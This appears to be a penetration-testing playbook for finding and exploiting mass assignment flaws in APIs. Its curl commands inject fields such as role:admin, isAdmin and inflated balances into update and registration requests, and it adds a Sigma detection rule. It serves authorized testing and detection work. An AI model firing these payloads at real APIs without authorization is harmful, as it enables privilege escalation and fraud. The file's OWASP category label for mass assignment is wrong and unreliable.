---
name: detecting-mass-assignment
description: <!-- Copyright (c) 2026 defconxt. All rights reserved. -->
---

<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
---
name: detecting-mass-assignment
description: >-
  Detect and exploit mass assignment vulnerabilities where APIs accept unintended
  fields in request bodies, enabling privilege escalation, balance manipulation,
  and business logic bypass through parameter pollution.
domain: cybersecurity
subdomain: api-security
tags:
  - mass-assignment
  - api-security
  - owasp-api6
  - parameter-pollution
  - privilege-escalation
version: "1.0"
author: defconxt
license: AGPL-3.0
metadata:
  mitre-attack: ["T1190"]
  owasp-api: ["API6"]
  tools: ["curl", "burp-suite", "arjun", "nuclei"]
---

# Detecting Mass Assignment

## Overview

Mass assignment occurs when an API blindly binds client-supplied JSON fields
to internal data models without filtering. Attackers inject fields like
`role`, `isAdmin`, `balance`, or `verified` to escalate privileges or
manipulate business logic. OWASP API6:2023.

## Prerequisites

- Tools: ["curl", "burp-suite", "arjun", "nuclei"]
- Test account with known writable fields
- Authorized testing engagement with written scope

## Key Concepts

- **Model binding**: Frameworks auto-map JSON keys to object properties
- **Hidden fields**: Properties in the model not exposed in documentation
- **Response diffing**: Compare request/response to find accepted hidden fields
- **Privilege fields**: `role`, `isAdmin`, `permissions`, `verified`, `balance`

## Workflow

### Step 1: Identify Target Endpoints

```bash
# Find update/create endpoints
grep -rE 'PUT|PATCH|POST' openapi.yaml | grep -v GET

# Capture normal update request
curl -s -X PUT https://target.com/api/users/me \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"testuser","email":"test@test.com"}' | jq .
```

### Step 2: Field Discovery via Response Analysis

```bash
# Get full user object to find all fields
curl -s -H "Authorization: Bearer $TOKEN" \
  https://target.com/api/users/me | jq 'keys'

# Common hidden fields to test
FIELDS=(
  '"role":"admin"'
  '"isAdmin":true'
  '"is_admin":true'
  '"permissions":["admin"]'
  '"verified":true'
  '"is_verified":true'
  '"balance":999999'
  '"credit":999999'
  '"discount":100'
  '"active":true'
  '"approved":true'
  '"level":"premium"'
  '"tier":"enterprise"'
  '"mfa_enabled":false'
  '"password_reset_required":false'
)

for FIELD in "${FIELDS[@]}"; do
  echo "[*] Testing: $FIELD"
  curl -s -X PUT https://target.com/api/users/me \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"name\":\"testuser\",$FIELD}" | jq .
done
```

### Step 3: Parameter Discovery with Arjun

```bash
# Discover hidden parameters
arjun -u https://target.com/api/users/me -m PUT \
  --headers "Authorization: Bearer $TOKEN" --json

# Custom wordlist for API-specific fields
arjun -u https://target.com/api/users/me -m PUT \
  -w api-params.txt --headers "Authorization: Bearer $TOKEN"
```

### Step 4: Registration Endpoint Mass Assignment

```bash
# Test mass assignment during registration
curl -s -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "newuser",
    "email": "new@test.com",
    "password": "Test1234!",
    "role": "admin",
    "isAdmin": true,
    "verified": true
  }' | jq .

# Verify assigned role
curl -s -H "Authorization: Bearer $NEW_TOKEN" \
  https://target.com/api/users/me | jq '.role, .isAdmin, .verified'
```

### Step 5: Nested Object Mass Assignment

```bash
# Test nested object manipulation
curl -s -X PUT https://target.com/api/users/me \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "testuser",
    "profile": {"verified": true},
    "settings": {"role": "admin"},
    "metadata": {"permissions": ["admin", "write"]}
  }' | jq .
```

## Detection Opportunities

| Signal | Source | Description |
|--------|--------|-------------|
| Unexpected fields in PUT/PATCH | API gateway | Fields not in schema |
| Role/permission changes | Audit logs | User self-modifying privileges |
| Registration with extra fields | Auth service | Hidden field injection |
| Rapid field probing | WAF | Many requests with varying fields |

```yaml
title: Mass Assignment Privilege Escalation Attempt
id: f6a7b8c9-d0e1-2345-f012-678901234567
status: experimental
description: Detects API requests containing privilege-related fields in update operations
logsource:
  category: application
detection:
  selection:
    http_method:
      - PUT
      - PATCH
      - POST
    request_body|contains:
      - '"role"'
      - '"isAdmin"'
      - '"is_admin"'
      - '"permissions"'
  condition: selection
falsepositives:
  - Admin users legitimately updating roles via admin panel
level: high
tags:
  - attack.t1190
  - attack.privilege_escalation
```

## Verification

- [ ] All update/create endpoints tested for mass assignment
- [ ] Privilege fields tested (role, admin, permissions)
- [ ] Registration endpoint tested for hidden fields
- [ ] Nested object injection tested
- [ ] Results documented with evidence
- [ ] Detection artifacts identified

## References

- [OWASP API6:2023 — Unrestricted Access to Sensitive Business Flows](https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/)
- [Arjun Parameter Discovery](https://github.com/s0md3v/Arjun)
- [MITRE ATT&CK T1190](https://attack.mitre.org/techniques/T1190/)
